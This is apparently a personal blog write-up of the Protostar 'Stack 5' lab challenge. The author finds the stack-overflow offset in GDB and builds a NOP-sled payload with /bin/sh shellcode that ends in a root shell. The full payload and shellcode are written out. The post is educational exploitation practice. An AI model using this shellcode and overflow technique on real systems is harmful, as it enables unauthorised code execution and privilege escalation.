---
layout: post
title: "B2B - Protostar, Stack5 (x86)"



---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 5

The sixth challenge of Protostar is "Stack 5". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack5
test
```

The program simply appears to take a single input, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the string "test" as it's input, and printed nothing. This, once again, is looking very similar to the previous challenge, "stack4", where we had to overwrite the EIP value with an address to our win() function. I wonder if this will have the same structure once again. First things first, let's dig deeper with GDB. I fired up the program and listed all the functions:

```
(gdb) info functions
All defined functions:

File stack5/stack5.c:
int main(int, char **);
```

Okay, so first things first, we don't have a win() function anymore. I'm assuming this will follow the same pattern as the previous challenges - all the way up to the EIP overwrite. For the record, this was the first challenge I peaked at the hints to see what the goal of this challenge was - and how it was designed to be exploited. These were:

 - At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
- Remove the int3s once your shellcode is done.

So, it looks like this will be our the first challenge of the Protostar series that requires my payload to include shellcode that I eventually jump to. This could likely be our first payload that drops a shell, exciting! Now we know how the challenge has been designed and the goal, let's take a look at the main function itself:

```
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
```

A high-level breakdown of this function can be seen as:

- Super simple program
- Grow the stack by 0x50 
- Takes user input via gets() <-- buffer overflow vulnerability lies here

As we can see, the main function is very similar to the previous challenges. It's likely that our previously used payload will also work here to give us full control of the EIP register (instruction pointer). Once again, if you haven't done much work with buffer overflows or controlling the execution of a programs flow via this attack vector, please check out some read ups online. Pretty much all of them are great and informative, especially if they focus on "vanilla EIP buffer overflows" or similar.

So, let's refresh. Our previously used payload was:

```
python -c 'print "A"*76 + "\xf4\x83\x04\x08"' > /tmp/stack4
```

This overflowed our buffer, filled the address in memory up to EIP with "A" characters, and then overwrote the EIP register to point at our win() function at address "0x080483f4". In the case of stack5, we want to point at a non-existing set of code, specifically our own shellcode. By redirecting EIP to our own shellcode, we will jump into a space of the buffer that we control and can add whatever instructions we want there - gaining our own custom flow of execution!

So, the next question is, how do we jump to our own shellcode? Luckily, there are multiple easy ways - but to narrow this down we need to first see where we can place shellcode. To do this, let's get hold of our EIP:

```
python -c 'print "A"*76 + "BBBB"' > /tmp/stack5
```

```
(gdb) r < /tmp/stack5
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/stack5

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Great!! Our payload from the previous challenge gave us control of EIP. So at this moment, we have 76 bytes of space that could hold shellcode (the A buffer), however, let's see if we can continue writing after our EIP overwrite to store shellcode there. We can check for this by attempting to add a number of C characters afterwards.

```
python -c 'print "A"*76 + "BBBB" + "C"*100' > /tmp/stack5
```

Running GDB with the above file as our input, we see the stack holds the following data:

```
(gdb) x/50wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141 <--- Input starts here
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x42424242 <--- EIP overwrite
0xbffffc60:	0x43434343	0x43434343	0x43434343	0x43434343 <--- Potential shellcode space
0xbffffc70:	0x43434343	0x43434343	0x43434343	0x43434343    
0xbffffc80:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffffc90:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffffca0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffffcb0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffffcc0:	0x43434343	0xb7ff6200
```

To relate the above to our payload:

- We have our 76 "A" characters represented by "0x41", as our junk
- We have our 4 "B" characters, represented by "0x42424242", as our EIP
- We have our remaining chunk of "C" characters, represented by "0x43434343", indicating space for our custom shellcode

We now know we have a nice amount of space on the stack, as well as a means of getting to this shellcode. For this attack, I will be using the shellcode obtained from <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">here</a>, which effectively just pops a new "/bin/sh" process. The shellcode is:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

After a few tweaks, our payload will now look like the following. You will notice I have added a little NOP sled between the EIP overwite and the start of our payload. This effectively gives us a range of addresses we can jump to - without accidentally missing any important shellcode bytes:

```
python -c 'print "A"*76 + "BBBB" + "\x90"*8 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/stack5
```

Running in GDB and placing a breakpoint of gets(), we can see our stack now looks like the following after we have given the process our input:

```
(gdb) x/50wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141 <-- Junk buffer
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x42424242 <-- EIP overwrite
0xbffffc60:	0x90909090	0x90909090	0x6850c031	0x68732f2f <-- 8 NOPs and shellcode
0xbffffc70:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
0xbffffc80:	0x00000001	0xbffffcc0	0xb7ff0626	0xb7fffab0
0xbffffc90:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffffca0:	0xbffffcd8	0x467eb6f5	0x6c3e00e5	0x00000000
0xbffffcb0:	0x00000000	0x00000000	0x00000001	0x08048310
0xbffffcc0:	0x00000000	0xb7ff6210
```

Everything looks great to me, we can see our input starts at "0xbffffc10", our EIP overwrite lies at "0xbffffc5c", our NOP sled starts at "0xbffffc60" and finally the shellcode starts at "0xbffffc68". We should now be able to set our EIP to any address between "0xbffffc60" and "0xbffffc67" and we should land in our shellcode. For the following payload, I chose to use "0xbffffc64":

```
python -c 'print "A"*76 + "\x64\xfc\xff\xbf" + "\x90"*8 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/stack5
```

Breaking at the same point as before, our stack now looks like this:

```
(gdb) x/50wx $esp
0xbffffc00:	0xbffffc10	0xb7ec6165	0xbffffc18	0xb7eada75
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0xbffffc64 <-- EIP
0xbffffc60:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffffc70:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
0xbffffc80:	0x00000001	0xbffffcc0	0xb7ff0626	0xb7fffab0
0xbffffc90:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
```

From the following output, you can see that the flow of execution worked correctly, and our new "/bin/dash" program appeared to execute!

```
(gdb) c
Continuing.
Executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.

Program exited normally.
```

However, because computers are hard and I'm derpy, my shell was immediately exiting. Input needs to be a thing (don't quote me, but the internet appears to agree). As the shell doesn't receive any input upon spawning, it exits immediately and then our program quits straight after. I guess this is expected behaviour, but not ideal if we want to be backdooring someone's PC, right? Right.

After a bit of research (shout out LiveOverflow, Billy Ellis and many others who are way better at this than me), it turns out you can just use 'cat' without any input and pipe this into the program. I'm not 100% sure how this works, but I guess cat outputs data, and it will output nothing forever if you ask it nicely, so if we "cat" nothing into a shell - then it stays open? Logic is strong, my knowledge is not. Let's try it!

```
$(cat /tmp/stack5; cat ) | ./stack5
```

Interestingly enough, this payload doesn't want to work outside of GDB. I know from past experiences and research that GDB does some weird padding to the environment we are in which can sometimes mess with addresses and the memory layout. Perhaps our EIP overwrite address is wrong (likely).. I guess this is one of the problems with hardcoding sensitive values and using magic numbers within 'code.' One thing we could try is extending our NOP sled to give us more wiggle room when jumping to our address. If we have a wider range of choice both before and after our target address then hopefully we have a higher chance that this address exists and holds one of our NOP instructions. Once extended, we will tweak the EIP overwrite address some more to make sure we land towards the middle of this sled.

```
python -c 'print "A"*76 + "\x60\xfc\xff\xbf" + "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/stack5
```

```
(gdb) x/50wx $esp
0xbffffc50:	0xbffffc60	0xb7ec6165	0xbffffc68	0xb7eada75
0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca0:	0x41414141	0x41414141	0x41414141	0xbffffc60
0xbffffcb0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcc0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcd0:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffffce0:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
0xbffffcf0:	0xbffffd28	0x957fdc62	0xbf3eca72	0x00000000
0xbffffd00:	0x00000000	0x00000000	0x00000001	0x08048310
0xbffffd10:	0x00000000	0xb7ff6210
```

From the output above, we can see that our EIP now points to the beginning of our "A" buffer, which is odd. Let's shift this up and point at "0xbffffcc0", one of the addresses within our NOP sled.

```
python -c 'print "A"*76 + "\xc0\xfc\xff\xbf" + "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/stack5
```

This payload works in GDB (again) and running it outside of GDB produces no errors, no illegal instructions and no segfaults. It looks like we might have worked, but the shell instantly closed again. Let's try the cat trick for our final attempt:

```
$ whoami
user
$ (cat /tmp/stack5; cat ) | ./stack5
whoami
root
```

Awesome! That popped the challenge as we wanted and gave us our root shell!